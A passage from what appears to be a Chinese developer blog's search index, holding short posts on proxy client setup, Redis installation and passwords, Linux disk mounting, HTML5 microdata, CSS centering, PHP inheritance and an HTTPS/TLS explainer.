4.6.2离线安装包下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=53344 如果连外网不方便，内网上传了一个资源: http://download.csdn.net/download/junbujianwpl/10133518 windows下使用 建议用pac模式。谁用谁知道。配置文件用默认的本地配置文件即可。然后呢，你的所有内网都走的原本线路，外网被墙的比如谷歌之类都走的shadowsock。真的很方便啊。。。。：） 客户端配置界面 服务器地址写你的vps的ip地址即可。端口号、密码、加密方式都按照服务端的配置写即可。]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[mysql支持emoji表情]]></title>
    <url>%2Farticles%2Fmysql%E6%94%AF%E6%8C%81emoji%E8%A1%A8%E6%83%85%2F</url>
    <content type="text"><![CDATA[数据库 字段 Character set 设置为 utf8mb4 , Collation 设置为 utf8mb4_unicode_ci 数据库连接 ‘charset’ =&gt; ‘utf8mb4’, ‘collation’ =&gt; ‘utf8mb4_unicode_ci’,]]></content>
  </entry>
  <entry>
    <title><![CDATA[HTML5 微数据]]></title>
    <url>%2Farticles%2FHTML5%20%E5%BE%AE%E6%95%B0%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[微数据（HTML5 microdata） 是一种在网页中提供附加语义的标准化方式。 微数据允许我们定义自定义元素以及在网页中嵌入自定义属性。从较高的角度而言，微数组由一组名-值对组成。 这个分组被称作条目，每个名-值对就是一个属性。条目和属性使用普通元素表示。 示例用 itemscope 属性创建一个条目。给条目添加一个属性，itemprop 属性用于条目的后代。 这里有两个条目，其中每个条目都有一个 “name” 属性： 1234567891011&lt;div itemscope&gt; &lt;p&gt;My name is &lt;span itemprop="name"&gt;Zara&lt;/span&gt;.&lt;/p&gt;&lt;/div&gt;&lt;div itemscope&gt; &lt;p&gt;My name is &lt;span itemprop="name"&gt;Nuha&lt;/span&gt;.&lt;/p&gt;&lt;/div&gt; 属性值通常是字符串，但是它可以是下列数据类型。 全局属性 微数据引入了五个全局属性，这些属性适用于在任意元素以及为数据提供上下文机制。 属性描述 itemscope用于创建一个条目。itemscope 属性是一个布尔值属性，说明页面上有微数据以及它从哪里开始。 itemtype这个属性是一个有效的 URL，用于定义条目以及为属性提供上下文。 itemid这个属性是条目的全局标识符。 itemprop这个属性为条目定义属性。 itemref这个属性提供了一个附加元素列表来抓取条目的名-值对。 属性数据类型 属性通常有一个正如上面的例子中提到的字符串值，但是它们的值也可以是 URLs。下面的例子中有一个 “image” 属性，它的值是一个 URL： 1&lt;div itemscope&gt; &lt;img itemprop="image" src="tp-logo.gif" alt="TutorialsPoint"&gt;&lt;/div&gt; 属性的值也可以是日期，时间或者日期和时间。下面是一个使用 time 元素和 datetime 属性的实现。 1&lt;div itemscope&gt;My birthday is:&lt;time itemprop="birthday" datetime="1971-05-08"&gt; Aug 5th 1971&lt;/time&gt;&lt;/div&gt; 属性本身也可以是一组名-值对，通过在元素上放置 itemscope 属性来声明属性。 微数据 API 支持 如果浏览器支持 HTML5 微数据 API，那么全局 document 对象上就会有一个 getItems() 函数。如果浏览器不支持微数据，getItems() 函数就会是 undefined。 1function supports_microdata_api() &#123; return !!document.getItems;&#125; Modernizr 还不支持微数据 API 检测，因此我们需要使用像上面一样列出的函数来检测。 HTML5 微数据标准包含 HTML 标记（主要用于搜索引擎）和一系列 DOM 函数（主要用于浏览器）。 我们可以在网页中引入微数据标记，不理解微数据属性的搜索引擎将会忽略它们。但是，如果需要通过 DOM 访问或者操作微数据，我们还需要检查浏览器是否支持微数据 DOM API。 定义微数据词汇表 要定义一个微数据词汇表我们需要一个只想有效网页的命名空间 URL。例如 http://data-vocabulary.org/Person 可以用作带下列命名属性的个人微数据词汇表的命名空间。 name - 人名，简单的字符串值。 Photo - 指向人物照片的 URL。URL - 属于个人的网站。下面是一个使用个人微数据相关属性的例子： 1234567&lt;section itemscope itemtype="http://www.example.com/Person"&gt;&lt;h1 itemprop="name"&gt;Andy Runie&lt;/h1&gt;&lt;p&gt; &lt;img itemprop="photo" src="http://www.example.com/photo.jpg "/&gt;&lt;/p&gt;&lt;a itemprop="url" href="http://www.example.com/blog"&gt;My Blog&lt;/a&gt;&lt;/section&gt; 我们使用Live Microdata执行上面的HTML代码，会得到下面的JSON数据： 典型DEMO: QQ自动识别,将下面这段代码加入到网站header里面 12345&lt;meta name="description" itemprop="description" content="我们坚持以自主研发、不断创新为发展动力，专注为企事业单位提供从移动应用开发、网站建设，到数据收集分析与云计算等的网络服务，以及互联网营销解决方案，形成了针对政府、企业、媒体等不同行业、不同规模、不同应用的系列产品和针对性解决方案。"&gt;&lt;meta itemprop="name" content="e攻城狮"&gt;&lt;meta itemprop="image" content="img/logolink.png"&gt; 在QQ聊天会话中去试试吧~]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[vue的微信分享bug]]></title>
    <url>%2Farticles%2Fvue%E7%9A%84%E5%BE%AE%E4%BF%A1%E5%88%86%E4%BA%ABbug%2F</url>
    <content type="text"><![CDATA[vue 默认路由是带有#的，但是在微信分享中， 我们遇到这种bug: https://xxxxx.com/#a 分享成功，不能跳回到当前路由 解决方法 https://xxxxx.com/ 分享成功，能跳回到当前路由]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下安装配置redis 自启动脚本]]></title>
    <url>%2Farticles%2FLinux%E4%B8%8B%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEredis%20%E8%87%AA%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930313233343536373839#!/bin/sh# chkconfig:2345 80 90# Simple Redis init.d script conceived to work on Linux systems# as it does use of the /proc filesystem.REDISPORT=6379EXEC=/usr/local/bin/redis-serverCLIEXEC=/usr/local/bin/redis-cliPIDFILE=/var/run/redis_$&#123;REDISPORT&#125;.pidCONF="/etc/redis.conf"case "$1" in start) if [ -f $PIDFILE ] then echo "$PIDFILE exists, process is already running or crashed" else echo "Starting Redis server..." $EXEC $CONF &amp; fi ;; stop) if [ ! -f $PIDFILE ] then echo "$PIDFILE does not exist, process is not running" else PID=$(cat $PIDFILE) echo "Stopping ..." $CLIEXEC -p $REDISPORT shutdown while [ -x /proc/$&#123;PID&#125; ] do echo "Waiting for Redis to shutdown ..." sleep 1 done echo "Redis stopped" fi ;; *) echo "Please use start or stop as first argument" ;;esac]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux删除svn保存的密码和用户名]]></title>
    <url>%2Farticles%2FLinux%E5%88%A0%E9%99%A4svn%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81%E5%92%8C%E7%94%A8%E6%88%B7%E5%90%8D%2F</url>
    <content type="text"><![CDATA[~/.subversion/auth/svn.simple/1233…… 把相关的username 下你自己的用户名和passwd下你自己的密码删掉，下次再对svn操作时就会让你重新输用户名和密码了。]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[如何给redis设置密码]]></title>
    <url>%2Farticles%2F%E5%A6%82%E4%BD%95%E7%BB%99redis%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[redis没有实现访问控制这个功能，但是它提供了一个轻量级的认证方式，可以编辑redis.conf配置来启用认证。 1、初始化Redis密码： 在配置文件中有个参数： requirepass 这个就是配置redis访问密码的参数； 比如 requirepass test123； （Ps:需重启Redis才能生效） redis的查询速度是非常快的，外部用户一秒内可以尝试多大150K个密码；所以密码要尽量长（对于DBA 没有必要必须记住密码）； 2、不重启Redis设置密码： 在配置文件中配置requirepass的密码（当redis重启时密码依然有效）。 1redis 127.0.0.1:6379&gt; config set requirepass test123 查询密码： 123redis 127.0.0.1:6379&gt; config get requirepass(error) ERR operation not permitted 密码验证： 123redis 127.0.0.1:6379&gt; auth test123OK 再次查询： 12345redis 127.0.0.1:6379&gt; config get requirepass1) "requirepass"2) "test123" PS：如果配置文件中没添加密码 那么redis重启后，密码失效； 3、登陆有密码的Redis： 在登录的时候的时候输入密码： 1redis-cli -p 6379 -a test123 先登陆后验证： 12345redis-cli -p 6379redis 127.0.0.1:6379&gt; auth test123OK AUTH命令跟其他redis命令一样，是没有加密的；阻止不了攻击者在网络上窃取你的密码； 认证层的目标是提供多一层的保护。如果防火墙或者用来保护redis的系统防御外部攻击失败的话，外部用户如果没有通过密码认证还是无法访问redis的。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux安装redis及Php扩展]]></title>
    <url>%2Farticles%2FLinux%E5%AE%89%E8%A3%85redis%E5%8F%8APhp%E6%89%A9%E5%B1%95%2F</url>
    <content type="text"><![CDATA[一 安装redis1. 下载redis包：wget http://download.redis.io/releases/redis-2.8.9.tar.gz2. 解压redis包后，进入redis-2.8.9目录中，进行编译先 make 然后 make install 测试一下 make test 最后运行redis服务端 /usr/local/bin/redis-server (服务端redis-cli) 3. 到此为止，就算安装完成了redis了 Q: 此时报错：Fatal error: Class ‘Redis’ not found in xxx.php on line 9.A: 因为没有安装php的redis扩展，所有php无法直接操作redis 二 现在是安装php的redis的扩展1，下载地址： http://pecl.php.net/package/redis2. 选择需要的版本: Available ReleasesVersionStateRelease DateDownloads 需要注意两个字段 系统架构： Architecture x86 x86 Zend版本：Zend Extension Build API320151012,TS,VC14 TS VC14 3. 安装1234567891011121314151617#加压文件到当前目录tar -zxvf redis-2.2.8.tgz#进入解压后的文件目录cd redis-2.2.8#用phpize生成configure/usr/local/php/bin/phpize #编译配置./configure --with-php-config=/usr/local/php/bin/php-config#编译make#安装make install 4，配置php.ini文件，使得php可以支持redis扩展编辑 /etc/php.ini 添加: extension=redis.so 重启服务； 测试下 php -i|grep redis 12redisRegistered save handlers =&gt; files user redis rediscluster redis rediscluster 到此Redis扩展安装完成]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux挂载新的硬盘]]></title>
    <url>%2Farticles%2FLinux%E6%8C%82%E8%BD%BD%E6%96%B0%E7%9A%84%E7%A1%AC%E7%9B%98%2F</url>
    <content type="text"><![CDATA[文字版 fdisk -l //先查询未挂载的硬盘名如：sdb1 等 mkfs.ext3 /dev/xvdb(新的盘) // 开始格式化 df -h // 查看挂载情况 mount /dev/xvdb /home // (/home挂载的地方， 最好是根路径下建一个空的文件夹) 开始挂载 vi /etc/fstab // 设置自动开启启动 格式： /dev/xvdb /home ext3 defaults 0 0 // 硬盘名 需要挂载的位置 格式 卸载挂载点： umount /home/ftp2 另：如果执行fdisk -l 报错，往下看↓ 发现有问题： Disk /dev/sdb doesn’t contain a valid partition table fdisk /dev/sdb 跟着向导一步步做下去（如果不知道该输入什么，就输入“m”并回车，可以打印出菜单）： 12345678910111213141516171819Command (m for help): mCommand actiona toggle a bootable flagb edit bsd disklabelc toggle the dos compatibility flagd delete a partitionl list known partition typesm print this menun add a new partition（后面的菜单省略，太长了） 这里我们要添加一个新的分区，所以输入“n”： 12345678910111213141516171819202122232425262728293031Command (m for help): nCommand actione extendedp primary partition (1-4)pPartition number (1-4): 1First cylinder (1-14098, default 1): （此处直接回车）Using default value 1Last cylinder or +size or +sizeM or +sizeK (1-14098, default 14098): （此处直接回车）Using default value 14098Command (m for help): pDisk /dev/sdb: 115.9 GB, 115964116992 bytes255 heads, 63 sectors/track, 14098 cylindersUnits = cylinders of 16065 * 512 = 8225280 bytesDevice Boot Start End Blocks Id System/dev/sdb1 1 14098 113242153+ 83 Linux 现在可以写入分区表了，所以输入“w”： 1234567Command (m for help): wThe partition table has been altered!Calling ioctl() to re-read partition table.Syncing disks. 现在再fdisk -l，结果正常 – 如果到这里挂载完成，以下内容可不看 – 图文版查看新硬盘fdisk -l 新添加的硬盘的编号为/dev/sdb 硬盘分区 进入fdisk模式 fdisk /dev/sdb 输入n进行分区 选择分区类型 这里有两个选项： p: 主分区 linux上主分区最多能有4个 e: 扩展分区 linux上扩展分区只能有1个，扩展分区创建后不能直接使用，还要在扩展分区上创建逻辑分区。 这里选择的p。 选择分区个数 只分1个分区 直接输入1 接下来设置柱面，默认即可 写入分区表 输入w，分区结束 分区结束后，查看/dev目录 ls -l /dev 可以看到刚刚生成的新分区sdb1 格式化分区将新分区格式化为ext3文件系统 mkfs -t ext3 /dev/sdb1 最后写入文件系统信息。 此时就可以用新创建的分区了 挂载硬盘 创建挂载点 在根目录下创建storage目录 mkdir /storage 将/dev/sdb1挂载到/storage下 mount /dev/sdb1 /storage 设置开机启动自动挂载新创建的分区不能开机自动挂载，每次重启机器都要手动挂载。 设置开机自动挂载需要修改/etc/fstab文件 vi /etc/fstab 在文件的最后增加一行 /dev/sdb1 /storage ext3 defaults 1 2]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[弱类型、强类型、动态类型、静态类型语言的区别是什么？]]></title>
    <url>%2Farticles%2F%E5%BC%B1%E7%B1%BB%E5%9E%8B-%E5%BC%BA%E7%B1%BB%E5%9E%8B-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%9E%8B-%E9%9D%99%E6%80%81%E7%B1%BB%E5%9E%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88-%2F</url>
    <content type="text"><![CDATA[基础概念Program Errors trapped errors。导致程序终止执行，如除0，Java中数组越界访问 untrapped errors。 出错后继续执行，但可能出现任意行为。如C里的缓冲区溢出、Jump到错误地址 Forbidden Behaviours 语言设计时，可以定义一组forbidden behaviors. 它必须包括所有untrapped errors, 但可能包含trapped errors. Well behaved、ill behaved well behaved: 如果程序执行不可能出现forbidden behaviors, 则为well behaved。 ill behaved: 否则为ill behaved… 强、弱类型，静态、动态类型强、弱类型 强类型strongly typed：如果一种语言的所有程序都是well behaved——即不可能出现forbidden behaviors，则该语言为strongly typed。 弱类型weakly typed：则为weakly typed。比如C语言的缓冲区溢出，属于trapped errors，即属于forbidden behaviors..故C是弱类型 前面的人也说了，弱类型语言，类型检查更不严格，如偏向于容忍隐式类型转换。譬如说C语言的int可以变成double。 这样的结果是：容易产生forbidden behaviours，所以是弱类型的 动态、静态类型 静态类型 statically: 如果在编译时拒绝ill behaved程序，则是statically typed; 动态类型dynamiclly: 如果在运行时拒绝ill behaviors, 则是dynamiclly typed。 误区大家觉得C语言要写int a, int b之类的，Python不用写(可以直接写a, b)，所以C是静态，Python是动态。这么理解是不够准确的。譬如Ocaml是静态类型的，但是也可以不用明确地写出来，所以 Ocaml是静态隐式类型 静态类型可以分为两种： 如果类型是语言语法的一部分，在是explicitly typed显式类型； 如果类型通过编译时推导，是implicity typed隐式类型, 比如ML和Haskell 示例 语言 类型 汇编 无类型 C/C++ 弱类型、静态类型 Perl/PHP 弱类型、动态类型检查 Java/C# 强类型、静态类型检查 Python, Scheme 强类型、动态类型检查 Java/C 静态显式类型 Ocaml, Haskell 静态隐式类型 弱类型： 123&gt; "1"+2&gt; '12' 强类型： 123456789101112131415&gt;&gt;&gt; "1"+2Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;TypeError: cannot concatenate 'str' and 'int' objects动态类型：&gt;&gt;&gt; a = 1&gt;&gt;&gt; type(a)&lt;type 'int'&gt;&gt;&gt;&gt; a = "s"&gt;&gt;&gt; type(a)&lt;type 'str'&gt; 静态类型： 123456Prelude&gt; let a = "123" :: Int&lt;interactive&gt;:2:9:Couldn't match expected type `Int' with actual type `[Char]' In the expression: "123" :: Int In an equation for `a': a = "123" :: Int]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>java</tag>
        <tag>php</tag>
        <tag>强、弱类型，静态、动态类型</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[现代PHP工具包]]></title>
    <url>%2Farticles%2F%E7%8E%B0%E4%BB%A3PHP%E5%B7%A5%E5%85%B7%E5%8C%85%2F</url>
    <content type="text"><![CDATA[这些组件、工具和库描绘了现代PHP的样子： Slimframework： 一个很好、很酷的小型框架 Symfony：一个由很多优秀、可重用组件构成的重量级框架 Guzzle：可以很简单容易发起HTTP请求的客户端 PHPUnit： 一个测试框架 Behat： 行为驱动的测试框架 PHPCS/CBF：代码规范、美化工具 Faker：生成测试数据的库 Psysh: 充满令人惊讶的交互式控制台 Composer：依赖管理，且有着其他很多有用的特性 Packagist：PHP包仓库 Twig: 模板引擎]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[css 如何使文字垂直居中]]></title>
    <url>%2Farticles%2Fcss%20%E5%A6%82%E4%BD%95%E4%BD%BF%E6%96%87%E5%AD%97%E5%9E%82%E7%9B%B4%E5%B1%85%E4%B8%AD%2F</url>
    <content type="text"><![CDATA[单行文本单行文本只需要将文本行高(line-height)和所在区域高度(height)设为一致即可： 1234567891011121314151617&lt;!--html代码--&gt;&lt;div id="div1"&gt; 这是单行文本垂直居中&lt;/div&gt;/*css代码*/&lt;style&gt;#div1 &#123; width: 300px; height: 100px; margin: 50px auto; border: 1px solid red; line-height: 100px; /*设置line-height与父级元素的height相等*/ text-align: center; /*设置文本水平居中*/ overflow: hidden; /*防止内容超出容器或者产生自动换行*/&#125;&lt;/style&gt; 显示结果: 这是单行文本垂直居中 多行文本多行文本垂直居中分为两种情况，一个是父级元素高度不固定，随着内容变化；另一个是父级元素高度固定。 父级高度不固定的时，高度只能通过内部文本来撑开。这样，我们可以通过设置内填充（padding）的值来使文本看起来垂直居中，只需设置padding-top和padding-bottom的值相等： 1234567891011121314151617181920212223&lt;!--html代码--&gt;&lt;div id="div1"&gt; 这是多行文本垂直居中， 这是多行文本垂直居中， 这是多行文本垂直居中， 这是多行文本垂直居中。&lt;/div&gt;/*css代码*/&lt;style&gt;#div1&#123; width: 300px; margin: 50px auto; border: 1px solid red; text-align: center; /*设置文本水平居中*/ padding: 50px 20px;&#125;&lt;/style&gt; 显示结果： 这是多行文本垂直居中， 这是多行文本垂直居中， 这是多行文本垂直居中， 这是多行文本垂直居中。 父级高度固定的时，设置父级div的display属性：display: table;；然后再添加一个div包含文本内容，设置其display:table-cell;和vertical-align:middle 123456789101112131415161718192021222324252627282930&lt;div id="outer"&gt; &lt;div id="middle"&gt; 这是固定高度多行文本垂直居中， 这是固定高度多行文本垂直居中， 这是固定高度多行文本垂直居中， 这是固定高度多行文本垂直居中。 &lt;/div&gt;&lt;/div&gt; &lt;style&gt;#outer&#123; width: 400px; height: 200px; margin: 50px auto; border: 1px solid red; display: table;&#125;#middle&#123; display:table-cell; vertical-align:middle; text-align: center; /*设置文本水平居中*/ width:100%;&#125;&lt;/style&gt; 显示结果: 这是固定高度多行文本垂直居中， 这是固定高度多行文本垂直居中， 这是固定高度多行文本垂直居中， 这是固定高度多行文本垂直居中。 #outer{ width: 400px; height: 200px; margin: 50px auto; border: 1px solid red; display: table; } #middle{ display:table-cell; vertical-align:middle; text-align: center; /*设置文本水平居中*/ width:100%; }]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[php继承相关的一个问题]]></title>
    <url>%2Farticles%2Fphp%E7%BB%A7%E6%89%BF%E7%9B%B8%E5%85%B3%E7%9A%84%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[Code: 123456789101112131415class A &#123; private function foo() &#123; echo "a"; &#125; public function test() &#123; $this-&gt;foo(); &#125;&#125;class B extends A &#123; public function foo() &#123; echo 'b'; &#125;&#125;$b = new B();$b-&gt;test(); // a 当子类继承父类之后，this的指向是动态绑定的，也就是说，当父类的方法被重写之后，调用的就是子类的方法，没有重写，就调用父类的方法。 在本文中，父类的foo方法是私有的，并没有继承给子类，也就没有重写之说，所以，根据前面的定论，没有重写就调用父类中的方法。所以就打印了’a’。 另外还有三种绑定方式，分别是 self parent static。 self是静态绑定，它的指向始终是在编译时所在的那个类。parnet也是静态绑定，它始终指向编译时所在类的父类，而这个父类是声明类时就指定了的，所以指向是明确的。static属于后期静态绑定，或者说是动态绑定或运行时绑定，它的指向与调用者有关。若调用者是所在类的实例，那么它就指向本类；若调用者是所在类子类的实例，它则指向子类。]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[聊聊HTTPS和SSL/TLS协议]]></title>
    <url>%2Farticles%2F%E8%81%8A%E8%81%8AHTTPS%E5%92%8CSSL-TLS%E5%8D%8F%E8%AE%AE%2F</url>
    <content type="text"><![CDATA[背景知识 大致了解几个基本术语（HTTPS、SSL、TLS）的含义 大致了解 HTTP 和 TCP 的关系（尤其是“短连接”VS“长连接”） 大致了解加密算法的概念（尤其是“对称加密与非对称加密”的区别） 大致了解 CA 证书的用途 HTTPHTTP 是一个网络协议，是专门用来帮你传输 Web 内容滴。大部分网站都是通过 HTTP 协议来传输 Web 页面、以及 Web 页面上包含的各种东东（图片、CSS 样式、JS 脚本）。 TCP简单地说，TCP 协议是 HTTP 协议的基石——HTTP 协议需要依靠 TCP 协议来传输数据。 在网络分层模型中，TCP 被称为“传输层协议”，而 HTTP 被称为“应用层协议”。 有很多常见的应用层协议是以 TCP 为基础的，比如“FTP、SMTP、POP、IMAP”等。 TCP 被称为“面向连接”的传输层协议。关于它的具体细节，我就不展开了，你只需知道：传输层主要有两个协议，分别是 TCP 和 UDP。TCP 比 UDP 更可靠。你可以把 TCP 协议想象成某个水管，发送端这头进水，接收端那头就出水。并且 TCP 协议能够确保，先发送的数据先到达（与之相反，UDP 不保证这点）。 SSL/TLSSSL 是全称 Secure Sockets Layer*（安全套接层）。它是在上世纪90年代中期，由网景公司设计的。（顺便插一句，网景公司不光发明了 SSL，还发明了很多 Web 的基础设施——比如 *CSS 样式表”和 JS 脚本） 为啥要发明 SSL 这个协议捏？因为原先互联网上使用的 HTTP 协议是明文的，存在很多缺点——比如传输内容会被偷窥（嗅探）和篡改。发明 SSL 协议，就是为了解决这些问题。 到了1999年，SSL 因为应用广泛，已经成为互联网上的事实标准。IETF 就在那年把 SSL 标准化。标准化之后的名称改为 TLS（是“Transport Layer Security”的缩写），中文叫做“传输层安全协议”。 很多相关的文章都把这两者并列称呼（SSL/TLS），因为这两者可以视作同一个东西的不同阶段。 HTTPS通常所说的 HTTPS 协议，说白了就是“HTTP 协议”和“SSL/TLS 协议”的组合。你可以把 HTTPS 大致理解为——“HTTP over SSL”或“HTTP over TLS”（反正 SSL 和 TLS 差不多）。 HTTP 协议如何使用 TCP 连接？HTTP 对 TCP 连接的使用，分为两种方式：俗称“短连接”和“长连接”（“长连接”又称“持久连接”，洋文叫做“Keep-Alive”或“Persistent Connection”） 假设有一个网页，里面包含好多图片，还包含好多外部的CSS 文件和 JS 文件。在“短连接”的模式下，浏览器会先发起一个 TCP 连接，拿到该网页的 HTML 源代码（拿到 HTML 之后，这个 TCP 连接就关闭了）。然后，浏览器开始分析这个网页的源码，知道这个页面包含很多外部资源（图片、CSS、JS）。然后针对每一个外部资源，再分别发起一个个 TCP 连接，把这些文件获取到本地（同样的，每抓取一个外部资源后，相应的 TCP 就断开） 相反，如果是“长连接”的方式，浏览器也会先发起一个 TCP 连接去抓取页面。但是抓取页面之后，该 TCP 连接并不会立即关闭，而是暂时先保持着（所谓的“Keep-Alive”）。然后浏览器分析 HTML 源码之后，发现有很多外部资源，就用刚才那个 TCP 连接去抓取此页面的外部资源。 在 HTTP 1.0 版本，默认使用的是“短连接”（那时候是 Web 诞生初期，网页相对简单，“短连接”的问题不大）； 到了1995年底开始制定 HTTP 1.1 草案的时候，网页已经开始变得复杂（网页内的图片、脚本越来越多了）。这时候再用短连接的方式，效率太低下了（因为建立 TCP 连接是有“时间成本”和“CPU 成本”滴）。所以，在 HTTP 1.1 中，默认采用的是“Keep-Alive”的方式。 加密和解密通俗而言，你可以把“加密”和“解密”理解为某种互逆的数学运算。就好比“加法和减法”互为逆运算、“乘法和除法”互为逆运算。 “加密”的过程，就是把“明文”变成“密文”的过程；反之，“解密”的过程，就是把“密文”变为“明文”。在这两个过程中，都需要一个关键的东东——叫做“密钥”——来参与数学运算。 啥是“对称加密”？ 所谓的“对称加密技术”，意思就是说：“加密”和“解密”使用相同的密钥。这个比较好理解。就好比你用 7zip 或 WinRAR 创建一个带密码（口令）的加密压缩包。当你下次要把这个压缩文件解开的时候，你需要输入同样的密码。在这个例子中，密码/口令就如同刚才说的“密钥”。 啥是“非对称加密”？ 所谓的“非对称加密技术”，意思就是说：“加密”和“解密”使用不同的密钥。这玩意儿比较难理解，也比较难想到。当年“非对称加密”的发明，还被誉为“密码学”历史上的一次革命。 由于篇幅有限，对“非对称加密”这个话题，我就不展开了。有空的话，再单独写一篇扫盲。 各自有啥优缺点？ 看完刚才的定义，很显然：（从功能角度而言）“非对称加密”能干的事情比“对称加密”要多。这是“非对称加密”的优点。但是“非对称加密”的实现，通常需要涉及到“复杂数学问题”。所以，“非对称加密”的性能通常要差很多（相对于“对称加密”而言）。 这两者的优缺点，也影响到了 SSL 协议的设计。 HTTPS 协议的需求兼容性 因为是先有 HTTP 再有 HTTPS。所以，HTTPS 的设计者肯定要考虑到对原有 HTTP 的兼容性。 这里所说的兼容性包括很多方面。比如已有的 Web 应用要尽可能无缝地迁移到 HTTPS；比如对浏览器厂商而言，改动要尽可能小； 基于“兼容性”方面的考虑，很容易得出如下几个结论： HTTPS 还是要基于 TCP 来传输 如果改为 UDP 作传输层，无论是 Web 服务端还是浏览器客户端，都要大改，动静太大了 单独使用一个新的协议，把 HTTP 协议包裹起来 （所谓的“HTTP over SSL”，实际上是在原有的 HTTP 数据外面加了一层 SSL 的封装。HTTP 协议原有的 GET、POST 之类的机制，基本上原封不动） 举个例子： 如果原来的 HTTP 是塑料水管，容易被戳破；那么如今新设计的 HTTPS 就像是在原有的塑料水管之外，再包一层金属水管。一来，原有的塑料水管照样运行；二来，用金属加固了之后，不容易被戳破。 可扩展性 前面说了，HTTPS 相当于是“HTTP over SSL”。 如果 SSL 这个协议在“可扩展性”方面的设计足够牛逼，那么它除了能跟 HTTP 搭配，还能够跟其它的应用层协议搭配。岂不美哉？ 现在看来，当初设计 SSL 的人确实比较牛。如今的 SSL/TLS 可以跟很多常用的应用层协议（比如：FTP、SMTP、POP、Telnet）搭配，来强化这些应用层协议的安全性。 接着刚才例子： 如果把 SSL/TLS 视作一根用来加固的金属管，它不仅可以用来加固输水的管道，还可以用来加固输煤气的管道。 保密性（防泄密） HTTPS 需要做到足够好的保密性。 说到保密性，首先要能够对抗嗅探（行话叫 Sniffer）。所谓的“嗅探”，通俗而言就是监视你的网络传输流量。如果你使用明文的 HTTP 上网，那么监视者通过嗅探，就知道你在访问哪些网站的哪些页面。 嗅探是最低级的攻击手法。除了嗅探，HTTPS 还需要能对抗其它一些稍微高级的攻击手法——比如“重放攻击”（后面讲协议原理的时候，会再聊）。 完整性（防篡改） 除了“保密性”，还有一个同样重要的目标是“确保完整性”。关于“完整性”这个概念，在之前的博文《扫盲文件完整性校验——关于散列值和数字签名》中大致提过。健忘的同学再去温习一下。 在发明 HTTPS 之前，由于 HTTP 是明文的，不但容易被嗅探，还容易被篡改。 举个例子： 咱们天朝的网络运营商（ISP）都比较流氓，经常有网友抱怨说访问某网站（本来是没有广告的），竟然会跳出很多中国电信的广告。为啥会这样捏？因为你的网络流量需要经过 ISP 的线路才能到达公网。如果你使用的是明文的 HTTP，ISP 很容易就可以在你访问的页面中植入广告。 所以，当初设计 HTTPS 的时候，还有一个需求是“确保 HTTP 协议的内容不被篡改”。 真实性（防假冒） 在谈到 HTTPS 的需求时，“真实性”经常被忽略。其实“真实性”的重要程度不亚于前面的“保密性”和“完整性”。 举个例子： 你因为使用网银，需要访问该网银的 Web 站点。那么，你如何确保你访问的网站确实是你想访问的网站？（这话有点绕） 有些天真的同学会说：通过看网址里面的域名，来确保。 为啥说这样的同学是“天真的”？因为 DNS 系统本身是不可靠的（尤其是在设计 SSL 的那个年代，连 DNSSEC 都还没发明）。由于 DNS 的不可靠（存在“域名欺骗”和“域名劫持”），你看到的网址里面的域名未必是真实滴！，所以，HTTPS 协议必须有某种机制来确保“真实性”的需求。 性能 再来说最后一个需求——性能。 引入 HTTPS 之后，不能导致性能变得太差。否则的话，谁还愿意用？ 为了确保性能，SSL 的设计者至少要考虑如下几点： 如何选择加密算法（“对称”or“非对称”）？ 如何兼顾 HTTP 采用的“短连接”TCP 方式？ SSL 是在1995年之前开始设计的，那时候的 HTTP 版本还是 1.0，默认使用的是“短连接”的 TCP 方式——默认不启用 Keep-Alive]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[端口占用怎么解决？]]></title>
    <url>%2Farticles%2F%E7%AB%AF%E5%8F%A3%E5%8D%A0%E7%94%A8%E6%80%8E%E4%B9%88%E8%A7%A3%E5%86%B3-%2F</url>
    <content type="text"><![CDATA[按键盘win+r 打开运行界面，输入cmd，确定，打开管理员界面 输入 netstat -aon | findstr :80 输入 tasklist|findstr &quot;4188&quot; 4188是第2步骤找到的PID 找到端口对应的服务名称,然后去关掉就行了]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Too many levels of symbolic links 问题]]></title>
    <url>%2Farticles%2FToo%20many%20levels%20of%20symbolic%20links%20%E9%97%AE%E9%A2%98%2F</url>
